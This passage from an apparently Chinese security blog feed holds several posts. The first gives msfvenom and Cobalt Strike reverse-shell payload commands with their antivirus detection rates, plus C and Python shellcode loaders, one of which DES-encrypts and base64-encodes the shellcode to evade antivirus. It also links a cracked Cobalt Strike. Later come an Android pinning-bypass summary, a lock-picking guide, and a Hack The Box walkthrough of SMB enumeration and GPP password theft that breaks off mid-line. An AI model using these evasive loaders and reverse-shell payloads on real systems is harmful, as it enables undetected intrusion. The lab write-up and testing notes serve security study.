    <content type="html"><![CDATA[<p>Bypass 4 Fun</p><a id="more"></a><table><thead><tr><th style="text-align:left">Payloads</th><th style="text-align:left">VirusTotal</th><th style="text-align:left">Remark</th></tr></thead><tbody><tr><td style="text-align:left">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=9876 -f exe &gt; Bufferfly.exe</td><td style="text-align:left">53/69</td><td style="text-align:left"></td></tr><tr><td style="text-align:left">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 16 LHOST=192.168.56.103 LPORT=9876 -f exe &gt; Bufferfly.exe</td><td style="text-align:left">52/69</td><td style="text-align:left"></td></tr><tr><td style="text-align:left">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=9876 -f c &gt; Bufferfly.c</td><td style="text-align:left">20/69</td><td style="text-align:left">Visual Studio编译生成32位可执行程序</td></tr><tr><td style="text-align:left">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 16 LHOST=192.168.56.103 LPORT=9876 -f c &gt; Bufferfly.c</td><td style="text-align:left">13/69</td><td style="text-align:left">Visual Studio编译生成32位可执行程序</td></tr><tr><td style="text-align:left">msfvenom -p windows/x64/meterpreter/reverse_tcp -e LHOST=192.168.56.103 LPORT=9876 -f py &gt; <a href="http://Bufferfly.py">Bufferfly.py</a></td><td style="text-align:left">23/69</td><td style="text-align:left">Payload需要与Python版本相匹配</td></tr><tr><td style="text-align:left">msfvenom -p windows/x64/meterpreter/reverse_tcp -e LHOST=192.168.56.103 LPORT=9876 -f py &gt; <a href="http://Bufferfly.py">Bufferfly.py</a> DES</td><td style="text-align:left">15/70</td><td style="text-align:left">Payload需要与Python版本相匹配 pyinstaller -F -w -p PATH_TO_PAKEAGE <a href="http://shellcode.py">shellcode.py</a> (Cryptodome)</td></tr><tr><td style="text-align:left">msfvenom -p windows/x64/meterpreter/reverse_tcp -e LHOST=192.168.56.103 LPORT=9876 -f py &gt; <a href="http://Bufferfly.py">Bufferfly.py</a> DES BASE64</td><td style="text-align:left">11/69</td><td style="text-align:left">Payload需要与Python版本相匹配 pyinstaller -F -w -p PATH_TO_PAKEAGE <a href="http://shellcode.py">shellcode.py</a> (Cryptodome)</td></tr><tr><td style="text-align:left">CobaltStrike windows/beacon_http/reverse_http x86 EXE</td><td style="text-align:left">50/67</td><td style="text-align:left"></td></tr><tr><td style="text-align:left">CobaltStrike windows/beacon_http/reverse_http x86 C</td><td style="text-align:left">27/70</td><td style="text-align:left">Visual Studio编译生成32位可执行程序</td></tr><tr><td style="text-align:left">CobaltStrike windows/beacon_http/reverse_http x64 Python</td><td style="text-align:left">23/68</td><td style="text-align:left">Payload需要与Python版本相匹配</td></tr><tr><td style="text-align:left">CobaltStrike windows/beacon_http/reverse_http x64 Python DES BASE64</td><td style="text-align:left">10/68</td><td style="text-align:left">Payload需要与Python版本相匹配 pyinstaller -F -w -p PATH_TO_PAKEAGE <a href="http://shellcode.py">shellcode.py</a> (Cryptodome)</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    LPVOID shellcode = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(shellcode, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    ((<span class="keyword">void</span>(*)())shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">buf = <span class="string">b&quot;shellcode&quot;</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(buf)</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.c_uint64(ptr),ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encrypt.py</span></span><br><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">buf = <span class="string">b&quot;shellcode&quot;</span></span><br><span class="line">key = <span class="string">b&#x27;DEADC0DE&#x27;</span></span><br><span class="line">des = DES.new(key, DES.MODE_ECB)</span><br><span class="line">pad = (<span class="number">8</span> - <span class="built_in">len</span>(buf) % <span class="number">8</span>) * <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">b64code = base64.b64encode(des.encrypt(buf + pad))</span><br><span class="line">print(b64code)</span><br><span class="line">print(<span class="built_in">len</span>(buf))</span><br><span class="line"><span class="comment">#---------------------------</span></span><br><span class="line"><span class="comment">#shellcode.py</span></span><br><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">b64code = <span class="string">b&quot;base64code&quot;</span></span><br><span class="line">length = <span class="number">510</span></span><br><span class="line">key = <span class="string">b&quot;DEADC0DE&quot;</span></span><br><span class="line">des = DES.new(key, DES.MODE_ECB)</span><br><span class="line">buf = des.decrypt(base64.b64decode(b64code))[:length]</span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(buf)</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"><span class="comment">#eval(base64.b64decode(&quot;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChwdHIpLGJ1ZixjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpKQ==&quot;))</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.c_uint64(ptr),ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line"><span class="comment">#exec(base64.b64decode(&quot;aGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoY3R5cGVzLmNfaW50KDApLGN0eXBlcy5jX2ludCgwKSxjdHlwZXMuY191aW50NjQocHRyKSxjdHlwZXMuY19pbnQoMCksY3R5cGVzLmNfaW50KDApLGN0eXBlcy5wb2ludGVyKGN0eXBlcy5jX2ludCgwKSkp&quot;))</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://shihs.github.io/blog/python/2018/07/13/Python-%E5%9F%B7%E8%A1%8Cpyinstaller%E7%94%A2%E7%94%9F%E7%9A%84exe%E6%AA%94%E5%87%BA%E7%8F%BENo-module%E9%8C%AF%E8%AA%A4%E8%A8%8A%E6%81%AF/">Python執行pyinstaller產生的執行檔出現No module錯誤訊息</a><br /><a href="https://zhuanlan.zhihu.com/p/262466175">python3 shellcode 使用eval函数 bypass AV</a><br /><a href="https://blog.csdn.net/starfish55555/article/details/104468518/">对于python中eval函数不能执行赋值操作的解决方法</a><br /><a href="http://blog.leanote.com/post/snowming/5e915cdcdf79">实验使用 C 编译 shellcode 免杀上线</a><br /><a href="https://www.cnblogs.com/QKSword/p/8384132.html">python3的Cryptodome</a><br /><a href="https://zhuanlan.zhihu.com/p/93718885">Cobalt Strike系列教程第一章：简介与安装</a><br /><a href="https://evi1cg.me/archives/teamserver.html">CS teamserver.bat</a><br /><a href="https://www.digter8.com/391.html">Cobalt Strike 4.3破解版</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;Bypass 4 Fun&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="Anti_AntiVirus" scheme="https://yoloyolo.top/tags/Anti-AntiVirus/"/>
    
    <category term="Meterpreter" scheme="https://yoloyolo.top/tags/Meterpreter/"/>
    
    <category term="CobaltStrike" scheme="https://yoloyolo.top/tags/CobaltStrike/"/>
    
  </entry>
  
  <entry>
    <title>某APP测试项目小结</title>
    <link href="https://yoloyolo.top/2021/08/01/Summary-For-Android-APP-Test/"/>
    <id>https://yoloyolo.top/2021/08/01/Summary-For-Android-APP-Test/</id>
    <published>2021-08-02T02:20:01.000Z</published>
    <updated>2022-05-14T16:03:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>Busy &amp; Lazy</p><a id="more"></a><h1 id="activity劫持"><a class="markdownIt-Anchor" href="#activity劫持"></a> Activity劫持</h1><p>Activity劫持，又称StrandHogg</p><p>具体介绍: <a href="https://www.freebuf.com/company-information/249009.html">https://www.freebuf.com/company-information/249009.html</a></p><p>利用方式与Clickjacking有些相似，都是通过UI欺骗，来引导用户进行恶意操作</p><p>至于防御手段<br />一方面是需要对用户进行安全意识培训与宣传<br />另一方面，APP可以检测自身是否被系统程序覆盖，同时可以检测程序进入后台是否由用户操作造成(Home键，返回键)</p><p>漏洞复现测试</p><blockquote><p><a href="https://www.freebuf.com/sectool/249725.html">https://www.freebuf.com/sectool/249725.html</a></p></blockquote><h1 id="android抓包"><a class="markdownIt-Anchor" href="#android抓包"></a> Android抓包</h1><p>一开始以为跟普通的Burp抓包区别不大，后来发现里面的门道还是挺多的</p><h2 id="用户证书与系统证书"><a class="markdownIt-Anchor" href="#用户证书与系统证书"></a> 用户证书与系统证书</h2><p>直接通过浏览器下载安装的证书为用户证书，一些安全性较高的APP不会信任用户证书</p><p>但是可以通过安装系统证书来绕过（需root）</p><blockquote><p><a href="https://blog.csdn.net/weixin_31702225/article/details/117694829">https://blog.csdn.net/weixin_31702225/article/details/117694829</a></p></blockquote><h2 id="单向验证与双向验证"><a class="markdownIt-Anchor" href="#单向验证与双向验证"></a> 单向验证与双向验证</h2><p>单/双向验证的一些细节就不再赘述<br />单向验证一般是客户端验证服务端<br />双向验证测试两者相互验证</p><p>把APK丢进jadx，搜索&quot;checkclienttrusted&quot;和&quot;checkservertrusted&quot;<br />两者分别对应&quot;验证客户端&quot;和&quot;验证服务端&quot;<br />Frida与Xposed+JustTrustME的方法大概都是去劫持验证过程从而进行Bypass</p><blockquote><p><a href="https://xz.aliyun.com/t/6551#toc-13">https://xz.aliyun.com/t/6551#toc-13</a></p></blockquote><h2 id="burpsuite-fiddler"><a class="markdownIt-Anchor" href="#burpsuite-fiddler"></a> Burpsuite &amp; Fiddler</h2><p>就这次的测试来看<br />Fiddler与Burpsuite都有些各自的毛病<br />比如Fiddler里401的请求到了Burpsuite就200<br />比如Burpsuite相比于Fiddler会少了几个HTTP头<br />但是两者结合来使用效果还是很不错的</p><h2 id="justreverseit"><a class="markdownIt-Anchor" href="#justreverseit"></a> JustReverseIt</h2><p><del>逆向不用管会不会逆向，逆向也不管能不能读懂Java代码，只要会在jadx里Ctrl+F就行</del><br />通过逆向，看到了一些HTTP验证头的计算方法，也看到了AES加密的密钥与加密方法，etc.<br />有了这些信息在进行测试的时候就能够多发现一点可测试的点</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Busy &amp;amp; Lazy&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="Android" scheme="https://yoloyolo.top/tags/Android/"/>
    
    <category term="Application_Test" scheme="https://yoloyolo.top/tags/Application-Test/"/>
    
  </entry>
  
  <entry>
    <title>浅析弹子挂锁的攻击方式</title>
    <link href="https://yoloyolo.top/2021/07/11/pin-tumbler-lock/"/>
    <id>https://yoloyolo.top/2021/07/11/pin-tumbler-lock/</id>
    <published>2021-07-12T01:24:29.000Z</published>
    <updated>2022-05-14T16:04:44.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文用于讨论弹子挂锁攻击方式，请勿用于违法用途</strong></p><p>Is key necessary to unlock?</p><p>Absolutely not.</p><a id="more"></a><h1 id="一些废话"><a class="markdownIt-Anchor" href="#一些废话"></a> 一些废话</h1><p>开锁这一技能在初中的时候跟一些不良同学学过</p><p>高中时开始熟练运用，如</p><ul><li>开空教室的门拿椅子</li><li>体育课开器材室的门</li><li>处理一些私人恩怨</li><li>etc.</li></ul><p>但是从来都没有具体的了解过锁具的结构，就像大一时的我空知道web安全的漏洞，但是从来都没有去具体研究相关的函数或代码，自然而然地就对自己的学习产生了瓶颈</p><p>锁具的安全与网络安全有些类似，都应当默认外界的输入是不安全的，或许这就是安全的通性</p><p>网上搜了下“传授开锁技能触犯传授犯罪方法罪”的内容，所以写这篇文章的时候内心还是有些忐忑与疑惑的</p><h2 id="忐忑"><a class="markdownIt-Anchor" href="#忐忑"></a> 忐忑</h2><blockquote><p>犯罪行为需要同时满足主观条件与客观条件</p></blockquote><ul><li>主观上：本文仅在讨论弹簧锁的攻击方式</li><li>客观上：本文仅在讨论弹簧锁的攻击方式</li></ul><h2 id="疑惑"><a class="markdownIt-Anchor" href="#疑惑"></a> 疑惑</h2><p>开锁与Hacking有些类似，都是一种对于公共安全具有潜在威胁的行为，但是个人感觉后者的门槛与复杂程度还是比前者高一些</p><p>某些情况下传授开锁技能会触犯传授犯罪方法罪，那么传授网络安全技能呢？</p><p>貌似也会，因为听说过老师教学生两手之后学生端了学校的网站最后老师被请喝茶的事</p><p><s>如果这篇文章真的涉嫌触犯传授犯罪方法罪，那公布EXP跟写漏洞分析文章的是不是都得该挨个抓</s></p><h1 id="弹簧锁结构概述"><a class="markdownIt-Anchor" href="#弹簧锁结构概述"></a> 弹簧锁结构概述</h1><p>图绘制过程没有对锁具进行具体的测量，比例可能存在较大的误差</p><p>（弹子组部分为了方便所以把弹子画得平齐，现实中锁的弹子肯定是不齐的，而且是与钥匙的形状对应的）</p><p><img src="/images/pin_tunbler_lock/01.png" alt="LOCKED" /></p><p><img src="/images/pin_tunbler_lock/02.png" alt="UNLOCKED" /></p><p><img src="/images/pin_tunbler_lock/03.png" alt="Pin Tumbler" /></p><h2 id="解锁步骤"><a class="markdownIt-Anchor" href="#解锁步骤"></a> 解锁步骤</h2><ol><li>钥匙插入锁芯，钥匙销与驱动销的空隙正好处于锁身与锁芯之间的截线，此时锁芯可以顺时针转动</li><li>锁芯顺时针转动时，锁芯上方的拨爪拨动锁舌的拨爪，向右压缩弹簧B，使锁舌向右移动</li><li>锁舌移动一定距离之后，锁舌解除了对于锁梁左侧的限制，在弹簧A的作用下弹出锁梁</li></ol><p>至此，解锁完毕</p><h1 id="method-0"><a class="markdownIt-Anchor" href="#method-0"></a> Method 0</h1><p><strong>模拟锁芯转动</strong></p><p><img src="/images/pin_tunbler_lock/04.png" alt="METHOD0" /></p><p>使用韧性强的铁丝（推荐伞的细伞骨）制成如图形状<br />利用杠杆原理拨动锁舌上的拨爪，压缩弹簧B，使锁舌向右移动，从而开锁</p><h2 id="特殊情况"><a class="markdownIt-Anchor" href="#特殊情况"></a> 特殊情况</h2><p>以上只是最普通的状况，个人手上的锁具不多，凭借自己的思考与观察得出以下两种特殊状况</p><h3 id="防拨盖片"><a class="markdownIt-Anchor" href="#防拨盖片"></a> 防拨盖片</h3><p><img src="/images/pin_tunbler_lock/05.png" alt="BUG0" /></p><p>锁芯与锁舌的之间个人感觉可以用防拨盖片挡住<br />一般来说，钥匙不会插入到这种深度的位置</p><h3 id="双向锁舌"><a class="markdownIt-Anchor" href="#双向锁舌"></a> 双向锁舌</h3><p>这个情况是基于手头上的一个锁具，纵向分布两组拨爪，分别对应两侧的锁舌</p><p>使用钥匙开锁时，顺时针转动锁芯带动两组拨爪，使两个锁舌对向移动，从而解锁</p><p><img src="/images/pin_tunbler_lock/06.png" alt="BUG1" /></p><p>如果是这种情况的话，单纯地将锁舌向右撬只会卡住锁梁的右边</p><p><strong>破解方法</strong></p><p>由于有两组拨爪，需要先撬动右边的锁舌，锁梁会在弹簧A的作用下向上移动，此时锁梁右侧不受锁舌限制，但锁梁左边会被限制，之后的步骤就不必多言</p><p>由于开锁类似于黑盒测试，无法看到锁的内部结构，所以只能收集一些信息来推断是否为双向锁舌<br />如果在尝试向右撬动锁舌后不能开锁，则需要考虑双向锁舌的情况<br />向左撬动锁舌，右侧锁梁会向上稍微移动一些距离，摁下后有清脆的金属撞击声，则为双向锁舌</p><h1 id="method-1"><a class="markdownIt-Anchor" href="#method-1"></a> Method 1</h1><p><strong>模拟钥匙</strong></p><p><img src="/images/pin_tunbler_lock/07.png" alt="BUG1" /></p><p>这个基本是通用的方法，也是最靠技术的方法，先用挑勾将截线对齐，然后用铁片转动锁芯</p><p>其难度与弹子数成正相关</p><h1 id="method-2"><a class="markdownIt-Anchor" href="#method-2"></a> Method 2</h1><p><strong>推进锁舌</strong></p><p>参考以下视频</p><blockquote><p><a href="https://www.youtube.com/watch?v=BEOWb68YumY">https://www.youtube.com/watch?v=BEOWb68YumY</a></p></blockquote><h1 id="method-3"><a class="markdownIt-Anchor" href="#method-3"></a> Method 3</h1><p><strong>强制破坏</strong></p><p>使用两个扳手插入锁梁，使用杠杆原理来破坏锁体</p><hr /><p>写到最后发现这些东西跟Web安全在某些角度是相通的<br />先拆卸掉锁，然后观察结构，再去分析开锁的方法，就与白盒对应<br />直接开锁就像黑盒<br />我想，或许这种安全的共通性值得我花一生的时间去追求与探索</p><hr /><p>参考</p><blockquote><p><a href="http://www.chaojilock.com/skill/2017-11-29/828.html">挂锁的结构是怎样的 普通挂锁结构图详细科普</a><br /><a href="http://gearkr.com/?p=87287">教你如何打开一把弹子锁</a><br /><a href="https://kknews.cc/home/9xaomll.html">用了这么多年挂锁，你知道锁是怎么运转的吗？</a><br /><a href="https://zh.wikipedia.org/wiki/%E5%BD%88%E5%AD%90%E9%8E%96">维基百科</a><br /><a href="https://www.youtube.com/watch?v=BEOWb68YumY">Open Lock with Soda Can</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;本文用于讨论弹子挂锁攻击方式，请勿用于违法用途&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Is key necessary to unlock?&lt;/p&gt;
&lt;p&gt;Absolutely not.&lt;/p&gt;</summary>
    
    
    
    <category term="Talk" scheme="https://yoloyolo.top/categories/Talk/"/>
    
    
    <category term="Lock_Picking" scheme="https://yoloyolo.top/tags/Lock-Picking/"/>
    
  </entry>
  
  <entry>
    <title>HTB_Windows_Set_1</title>
    <link href="https://yoloyolo.top/2021/07/04/HTB-Windows-Set-1/"/>
    <id>https://yoloyolo.top/2021/07/04/HTB-Windows-Set-1/</id>
    <published>2021-07-04T21:09:07.000Z</published>
    <updated>2021-07-11T15:34:25.000Z</updated>
    
    <content type="html"><![CDATA[<ul><li>HTB返场了几台Windows的靶机</li><li>确定了暑假的实习</li><li>考试周的考试安排得靠后</li></ul><p>正巧</p><a id="more"></a><h1 id="active"><a class="markdownIt-Anchor" href="#active"></a> Active</h1><h2 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.100</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.100</span><br><span class="line">Host is up (0.59s latency).</span><br><span class="line">Not shown: 982 closed ports</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Microsoft DNS 6.1.7601</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-04 09:21:59Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Service</span><br><span class="line">49152/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>开了53端口，基本确定是台DC</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 10.10.10.100</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 10.10.10.100</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line"> ====================================== </span><br><span class="line">|    OS information on 10.10.10.100    |</span><br><span class="line"> ====================================== </span><br><span class="line">Use of uninitialized value <span class="variable">$global_workgroup</span> <span class="keyword">in</span> concatenation (.) or string at ./enum4linux.pl line 458.</span><br><span class="line">Use of uninitialized value <span class="variable">$os_info</span> <span class="keyword">in</span> concatenation (.) or string at ./enum4linux.pl line 464.</span><br><span class="line">[+] Got OS info <span class="keyword">for</span> 10.10.10.100 from smbclient: </span><br><span class="line">Use of uninitialized value <span class="variable">$global_workgroup</span> <span class="keyword">in</span> concatenation (.) or string at ./enum4linux.pl line 467.</span><br><span class="line">[+] Got OS info <span class="keyword">for</span> 10.10.10.100 from srvinfo:</span><br><span class="line">10.10.10.100   Wk Sv PDC Tim NT     Domain Controller</span><br><span class="line">platform_id     :500</span><br><span class="line">os version      :6.1</span><br><span class="line">server <span class="built_in">type</span>     :0x80102b</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line"> ========================================= </span><br><span class="line">|    Share Enumeration on 10.10.10.100    |</span><br><span class="line"> ========================================= </span><br><span class="line">Use of uninitialized value <span class="variable">$global_workgroup</span> <span class="keyword">in</span> concatenation (.) or string at ./enum4linux.pl line 640.</span><br><span class="line"></span><br><span class="line">Sharename       Type      Comment</span><br><span class="line">---------       ----      -------</span><br><span class="line">ADMIN$          Disk      Remote Admin</span><br><span class="line">attacker_folder Disk      </span><br><span class="line">C$              Disk      Default share</span><br><span class="line">IPC$            IPC       Remote IPC</span><br><span class="line">NETLOGON        Disk      Logon server share </span><br><span class="line">Replication     Disk      </span><br><span class="line">SYSVOL          Disk      Logon server share </span><br><span class="line">Users           Disk      </span><br></pre></td></tr></table></figure><p>应该可以匿名登录</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.100</span><br><span class="line"></span><br><span class="line">Disk                                                  PermissionsComment</span><br><span class="line">----                                                  ------------------</span><br><span class="line">ADMIN$                                            NO ACCESSRemote Admin</span><br><span class="line">attacker_folder                                   NO ACCESS</span><br><span class="line">C$                                                NO ACCESSDefault share</span><br><span class="line">IPC$                                              NO ACCESSRemote IPC</span><br><span class="line">NETLOGON                                          NO ACCESSLogon server share </span><br><span class="line">Replication                                       READ ONLY</span><br><span class="line">SYSVOL                                            NO ACCESSLogon server share </span><br><span class="line">Users                                             NO ACCESS</span><br></pre></td></tr></table></figure><p>下载整个文件夹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.10.100/Replication</span><br><span class="line">mask <span class="string">&quot;&quot;</span></span><br><span class="line">recurse ON</span><br><span class="line">prompt OFF</span><br><span class="line">mget active.htb</span><br></pre></td></tr></table></figure><p>拿到GPP密文密码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat active.htb/Policies/&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;/MACHINE/Preferences/Groups</span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;Groups clsid=<span class="string">&quot;&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;&quot;</span>&gt;&lt;User clsid=<span 